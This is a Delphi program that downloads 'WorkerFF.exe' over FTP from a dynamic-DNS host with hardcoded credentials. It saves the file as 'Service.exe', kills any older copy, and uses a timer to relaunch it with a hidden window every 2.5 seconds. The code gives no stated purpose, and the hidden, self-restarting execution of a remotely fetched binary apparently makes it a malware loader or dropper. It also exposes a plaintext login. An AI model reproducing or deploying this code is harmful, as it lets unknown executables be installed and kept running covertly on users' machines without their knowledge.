program Project1;
uses
  SysUtils, ShellAPI, Windows, IdFTP, Tlhelp32, Classes;
  var
  FTP:TIdFtp;
  dir,s: string;
  i:integer;
  version:textfile;
  versionupdate:string;
  SL:TStringList;
  H: THandle;

function timeSetEvent(uDelay, uResolution: Longint; lpFunction: pointer; dwUser, uFlags: Longint): Longint;stdcall;external 'winmm.dll';



  function KillTask(ExeFileName: string): integer;
const
  PROCESS_TERMINATE=$0001;
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
begin
  result := 0;

  FSnapshotHandle := CreateToolhelp32Snapshot
  (TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle,
  FProcessEntry32);

  while integer(ContinueLoop) <> 0 do
  begin
    if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) =
    UpperCase(ExeFileName)) or (UpperCase(FProcessEntry32.szExeFile) =
    UpperCase(ExeFileName))) then
      Result := Integer(TerminateProcess(OpenProcess(
      PROCESS_TERMINATE, BOOL(0), FProcessEntry32.th32ProcessID), 0));
    ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;

  CloseHandle(FSnapshotHandle);
end;

function FindTask(ExeFileName: string): integer;
 var
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
 begin
  result := 0;
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
  while integer(ContinueLoop) <> 0 do
   begin
    if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) = UpperCase(ExeFileName))
     or (UpperCase(FProcessEntry32.szExeFile) = UpperCase(ExeFileName)))
      then Result := 1;
    ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
   end;
  CloseHandle(FSnapshotHandle);
 end;

 procedure On_Timer(uTimerID, uMsg, dwUser, dw1, dw2: LongInt);stdcall;
begin
  if findtask('Service.exe')>0 then
  write('yes')
  else
  ShellExecute(0,nil, 'Service.exe', nil, nil, SW_Hide);

end;

begin
H := CreateMutex(nil, True, '11111');
if GetLastError = ERROR_ALREADY_EXISTS then
Exit;
s:='1';
  versionupdate:='1.1';
   SL:=TStringList.Create();

       if not FileExists('version.txt') then
      begin

        SL.Add(s);
        SL.SaveToFile('version.txt');
      end;
   SL.LoadFromFile('version.txt');
  s:=SL.Strings[0];
  SL.Free;
  writeln(s);
  if s=versionupdate then
  else
  begin
  AssignFile(version, 'version.txt');
  if not FileExists(ExtractFilePath( ParamStr(0) )) then
 begin
  Rewrite(version);
  CloseFile(version);
 end;
  ReWrite(version);
  writeln(version,'1.1');
  CloseFile(version);
  killtask('service.exe');
  DeleteFile('Service.exe');
  dir := GetCurrentDir;
  FTP := TIdFTP.Create(nil);
   try
  FTP.Username:= 'ff';
  FTP.Password:= 'WorkerFF';
  FTP.Port:= 21;
  FTP.Host:= 'fokes1.asuscomm.com';
  FTP.Passive:= True;
  FTP.Connect;
  if FTP.Connected then
    try
      FTP.Get('WorkerFF.exe', dir+'/Service.exe', True);
    except
      on E : Exception do
    end;

   finally
     FTP.Quit;
     FTP.Free;
   end;
  end;
  timeSetEvent(2500, 2500, @On_Timer, 0, 1);
  readln;
end.
